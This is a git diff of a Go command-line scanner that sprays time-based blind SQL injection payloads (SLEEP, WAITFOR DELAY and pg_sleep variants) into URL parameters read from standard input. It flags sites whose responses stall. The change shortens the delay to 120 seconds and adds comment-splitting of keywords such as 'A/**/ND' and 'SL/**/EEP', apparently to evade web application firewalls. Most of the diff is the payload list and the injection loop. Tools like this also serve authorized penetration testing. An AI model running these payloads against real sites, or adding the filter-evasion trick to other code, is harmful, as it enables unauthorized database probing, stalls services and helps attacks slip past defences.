@@ -4,86 +4,88 @@ import (
 	"bufio"
 	"flag"
 	"fmt"
+	"math"
 	"net/http"
 	"net/url"
 	"os"
 	"regexp"
+	"strings"
 	"sync"
 	"time"
 )
 
 var sql_payloads = []string{
-	"sleep(240)#",
-	"1 or sleep(240)#",
-	"\" or sleep(240)#",
-	"' or sleep(240)#\"",
-	"\" or sleep(240)=",
-	"' or sleep(240)='",
-	"1) or sleep(240)#",
-	"\") or sleep(240)=\"",
-	"') or sleep(240)='",
-	"1)) or sleep(240)#",
-	"\")) or sleep(240)=\"",
-	"')) or sleep(240)='",
-	";waitfor delay '0:0:240'--",
-	");waitfor delay '0:0:240'--",
-	"';waitfor delay '0:0:240'--",
-	"\";waitfor delay '0:0:240'--",
-	"');waitfor delay '0:0:240'--",
-	"\");waitfor delay '0:0:240'--",
-	"));waitfor delay '0:0:240'--",
-	"'));waitfor delay '0:0:240'--",
-	"\"));waitfor delay '0:0:240'--",
+	"sleep(120)#",
+	"1 or sleep(120)#",
+	"\" or sleep(120)#",
+	"' or sleep(120)#\"",
+	"\" or sleep(120)=",
+	"' or sleep(120)='",
+	"1) or sleep(120)#",
+	"\") or sleep(120)=\"",
+	"') or sleep(120)='",
+	"1)) or sleep(120)#",
+	"\")) or sleep(120)=\"",
+	"')) or sleep(120)='",
+	";waitfor delay '0:0:120'--",
+	");waitfor delay '0:0:120'--",
+	"';waitfor delay '0:0:120'--",
+	"\";waitfor delay '0:0:120'--",
+	"');waitfor delay '0:0:120'--",
+	"\");waitfor delay '0:0:120'--",
+	"));waitfor delay '0:0:120'--",
+	"'));waitfor delay '0:0:120'--",
+	"\"));waitfor delay '0:0:120'--",
 	"pg_sleep(5)--",
-	"1 or pg_sleep(240)--",
-	"\" or pg_sleep(240)--",
-	"' or pg_sleep(240)--",
-	"1) or pg_sleep(240)--",
-	"\") or pg_sleep(240)--",
-	"') or pg_sleep(240)--",
-	"1)) or pg_sleep(240)--",
-	"\")) or pg_sleep(240)--",
-	"')) or pg_sleep(240)--",
-	"AND (SELECT * FROM (SELECT(SLEEP(240)))bAKL) AND 'vRxe'='vRxe",
-	"AND (SELECT * FROM (SELECT(SLEEP(240)))YjoC) AND '%'='",
-	"AND (SELECT * FROM (SELECT(SLEEP(240)))nQIP)",
-	"AND (SELECT * FROM (SELECT(SLEEP(240)))nQIP)--",
-	"AND (SELECT * FROM (SELECT(SLEEP(240)))nQIP)#",
-	"SLEEP(240)#",
-	"SLEEP(240)--",
-	"SLEEP(240)=",
-	"SLEEP(240)='",
-	"or SLEEP(240)",
-	"or SLEEP(240)#",
-	"or SLEEP(240)--",
-	"or SLEEP(240)=",
-	"or SLEEP(240)='",
-	"waitfor delay '00:00:240'",
-	"waitfor delay '00:00:240'--",
-	"waitfor delay '00:00:240'#",
-	"pg_SLEEP(240)",
-	"pg_SLEEP(240)--",
-	"pg_SLEEP(240)#",
-	"or pg_SLEEP(240)",
-	"or pg_SLEEP(240)--",
-	"or pg_SLEEP(240)#",
+	"1 or pg_sleep(120)--",
+	"\" or pg_sleep(120)--",
+	"' or pg_sleep(120)--",
+	"1) or pg_sleep(120)--",
+	"\") or pg_sleep(120)--",
+	"') or pg_sleep(120)--",
+	"1)) or pg_sleep(120)--",
+	"\")) or pg_sleep(120)--",
+	"')) or pg_sleep(120)--",
+	"AND (SELECT * FROM (SELECT(SLEEP(120)))bAKL) AND 'vRxe'='vRxe",
+	"AND (SELECT * FROM (SELECT(SLEEP(120)))YjoC) AND '%'='",
+	"AND (SELECT * FROM (SELECT(SLEEP(120)))nQIP)",
+	"AND (SELECT * FROM (SELECT(SLEEP(120)))nQIP)--",
+	"AND (SELECT * FROM (SELECT(SLEEP(120)))nQIP)#",
+	"SLEEP(120)#",
+	"SLEEP(120)--",
+	"SLEEP(120)=",
+	"SLEEP(120)='",
+	"or SLEEP(120)",
+	"or SLEEP(120)#",
+	"or SLEEP(120)--",
+	"or SLEEP(120)=",
+	"or SLEEP(120)='",
+	"waitfor delay '00:00:120'",
+	"waitfor delay '00:00:120'--",
+	"waitfor delay '00:00:120'#",
+	"pg_SLEEP(120)",
+	"pg_SLEEP(120)--",
+	"pg_SLEEP(120)#",
+	"or pg_SLEEP(120)",
+	"or pg_SLEEP(120)--",
+	"or pg_SLEEP(120)#",
 	"'\"",
-	"AnD SLEEP(240)",
-	"AnD SLEEP(240)--",
-	"AnD SLEEP(240)#",
-	"&&SLEEP(240)",
-	"&&SLEEP(240)--",
-	"&&SLEEP(240)#",
-	"' AnD SLEEP(240) ANd '1",
-	"'&&SLEEP(240)&&'1",
-	"ORDER BY SLEEP(240)",
-	"ORDER BY SLEEP(240)--",
-	"ORDER BY SLEEP(240)#",
-	"(SELECT * FROM (SELECT(SLEEP(240)))ecMj)",
-	"(SELECT * FROM (SELECT(SLEEP(240)))ecMj)#",
-	"(SELECT * FROM (SELECT(SLEEP(240)))ecMj)--",
-	"+ SLEEP(240) + '",
-	"SLEEP(240)/*' or SLEEP(240) or '\" or SLEEP(240) or \"*/",
+	"AnD SLEEP(120)",
+	"AnD SLEEP(120)--",
+	"AnD SLEEP(120)#",
+	"&&SLEEP(120)",
+	"&&SLEEP(120)--",
+	"&&SLEEP(120)#",
+	"' AnD SLEEP(120) ANd '1",
+	"'&&SLEEP(120)&&'1",
+	"ORDER BY SLEEP(120)",
+	"ORDER BY SLEEP(120)--",
+	"ORDER BY SLEEP(120)#",
+	"(SELECT * FROM (SELECT(SLEEP(120)))ecMj)",
+	"(SELECT * FROM (SELECT(SLEEP(120)))ecMj)#",
+	"(SELECT * FROM (SELECT(SLEEP(120)))ecMj)--",
+	"+ SLEEP(120) + '",
+	"SLEEP(120)/*' or SLEEP(120) or '\" or SLEEP(120) or \"*/",
 }
 
 func CheckContains(url_t string) bool {
@@ -102,6 +104,8 @@ func TestOneByOneSQLi(url_t string, name string, wg *sync.WaitGroup, sem chan bo
 	payloads := url.Values{}
 	var new_url string
 	for _, sql_payload := range sql_payloads {
+		replacer := strings.NewReplacer("AND", "A/**/ND", "OR", "O/**/R", "SLEEP(", "SL/**/EEP/**/(")
+		sql_payload = replacer.Replace(sql_payload)
 		payloads.Set(name, sql_payload)
 		encoded_payloads := payloads.Encode()
 		if CheckContains(url_t) {
@@ -114,7 +118,7 @@ func TestOneByOneSQLi(url_t string, name string, wg *sync.WaitGroup, sem chan bo
 		if err != nil {
 			continue
 		}
-		if time.Since(start).Seconds() > 240 {
+		if math.Round(time.Since(start).Seconds()) > 120 {
 			fmt.Printf("\nPossibly vulnerable to SQLi ---> %s?%s=%s\n", ExtractHostToPrint(url_t), name, sql_payload)
 		}
 	}
@@ -125,7 +129,6 @@ func main() {
 	var wg sync.WaitGroup
 	conc := flag.Int("concurrency", 10, "concurrency level")
 	sem := make(chan bool, *conc)
-	fmt.Print("\033[s")
 	for reader.Scan() {
 		url_t := reader.Text()
 		parsedUri, _ := url.Parse(url_t)
@@ -141,4 +144,3 @@ func main() {
 	}
 	wg.Wait()
 }
-
